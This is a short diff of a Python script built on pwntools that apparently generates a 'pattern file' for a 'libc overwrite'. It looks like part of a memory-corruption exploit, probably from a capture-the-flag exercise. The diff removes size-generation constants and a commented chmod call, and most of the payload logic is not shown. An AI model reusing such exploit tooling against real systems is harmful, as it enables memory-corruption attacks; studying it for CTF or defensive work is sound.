@@ -5,19 +5,6 @@ import os
 from pwn import *
 import time
 
-def size():
-    n = 128
-    while True:
-        yield n
-        n = 2*n + 2
-
-MAX_LEN = 1090519038
-NUM_PATTERNS = 0xc600
-
-MMAP_SIZE = 128*1024
-longstr = b'y'*MAX_LEN
-
-gen = size()
 sizes = [133118, 266238, 532478, 1064958, 2129918, 4259838, 8519678, 17039358, 34078718, 68157438, 136314878, 272629758, 545259518, 1090519038]
 
 # need to make the pattern chunk smaller
@@ -112,5 +99,4 @@ print("Finished libc overwrite!")
 print("Length of libc overwrite string: {:}".format(hex(length)))
 
 file.close()
-# os.system("chmod +x ./patt")
-print("Finished in {:.3f} seconds.".format(time.time()-start))
+print("Finished pattern file in {:.3f} seconds.".format(time.time()-start))
